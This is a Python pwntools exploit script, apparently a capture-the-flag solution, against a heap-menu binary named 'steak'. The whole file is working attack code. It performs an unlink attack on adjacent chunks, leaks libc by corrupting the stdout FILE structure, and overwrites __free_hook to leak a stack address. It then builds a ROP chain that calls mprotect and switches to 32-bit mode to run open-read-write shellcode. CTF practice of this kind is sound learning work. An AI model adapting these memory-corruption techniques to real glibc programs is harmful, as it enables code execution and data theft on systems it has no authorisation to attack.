from pwn import *
context.os='Linux'
#context.arch='amd64'
debug = 1
if debug:
    #context.log_level='debug'
    cn=process('./steak')
    elf=ELF('./steak')
    # libc=ELF('./libc-2.23.so')
    libc = elf.libc
s       = lambda data               :cn.send(str(data))
sa      = lambda delim,data         :cn.sendafter(str(delim), str(data)) 
st      = lambda delim,data         :cn.sendthen(str(delim), str(data)) 
sl      = lambda data               :cn.sendline(str(data)) 
sla     = lambda delim,data         :cn.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :cn.recv(numb)
rl  = lambda              :cn.recvline()
ru      = lambda delims             :cn.recvuntil(delims)
irt     = lambda                    :cn.interactive()
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
 
def add(size,buf):
    ru('>')
    sl(1)
    ru('size:')
    sl(size)
    ru('buf:')
    s(buf)
def delete(index):
    ru('>')
    sl(2)
    ru('index:')
    sl(index)
def edit(index,size,buf):
    ru('>')
    sl(3)
    ru('index:')
    sl(index)
    ru('size:')
    sl(size)
    ru('buf:')
    s(buf)
def copy(s_index,d_index,length):
    ru('>')
    sl(4)
    ru('source index:')
    sl(s_index)
    ru('dest index:')
    sl(d_index)
    ru('length:')
    sl(length)
#write stdout to leak addr
stdout = 0x602180
src = 0x6021a0
main = 0x400b83
#unlink
add(0x80,'a'*0x80)#0
add(0x80,'b'*0x80)#1
add(0x80,'c'*0x80)#2
add(0x80,'d'*0x80)#3
add(0x80,'e'*0x80)#4
edit(3,0x90,p64(0)+p64(0x81)+p64(src)+p64(src+8)+'d'*0x60+p64(0x80)+p64(0x90))
 
delete(4)   #unlink src[3]->src[0]
 
#leak libc
edit(3,16,p64(src)+p64(stdout))
copy(1,0,8)#src[0]=*stdout
payload = p64(0xfbad1800)+p64(0)*3+'\x00'
edit(0,len(payload),payload)
r(8)
r(8)
r(8)
r(8)
leak = uu64(r(8))-0x3c36e0
success('leak= {}'.format(hex(leak)))
libc.address = leak
 
#write free_hook to leak stack
free_hook = libc.symbols['__free_hook']
puts = libc.symbols['puts']
env = libc.symbols['environ']
edit(3,16,p64(free_hook)+p64(env))
edit(0,8,p64(puts))
delete(1)
stack = uu64(r(7)[1:])
success('stack= {}'.format(hex(stack)))
ret = stack-0xf0
 
#open read write flag
shellcode = asm('mov esp,0x602500')+asm(shellcraft.open("flag"))
ss = '''
mov ebx, eax
mov ecx, 0x602900
mov edx,0x50
int 0x80
mov eax,4
mov ebx, 1
mov ecx, 0x602900
mov edx,0x50
int 0x80
'''
shellcode+=asm(ss)
p_rdi=0x400ca3
p_rdx_rsi = 0x00000000001150c9+libc.address
mprotect = libc.symbols['mprotect']
#retfq = 0x107428 + libc.address#0x002bca4c
retfq = 0x811dc+libc.address
'''
code = asm('retfq',arch='amd64')
code = next(libc.search(code))#0x811dc
success('retfq address: {}'.format(hex(code)))
'''
mode = p64(retfq) + p64(0x602500) + p64(0x23)#retfq + eip + mode
rop = p64(p_rdi)+p64(0x602000)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(mprotect)+mode
 
print len(shellcode)#63
edit(3,8,p64(0x602500))
edit(0,0x44,shellcode+(0x40-63)*'\x00'+'flag')
edit(3,8,p64(ret))
gdb.attach(cn,"b *0x400922")
edit(0,len(rop),rop)
 
sl(5)
irt()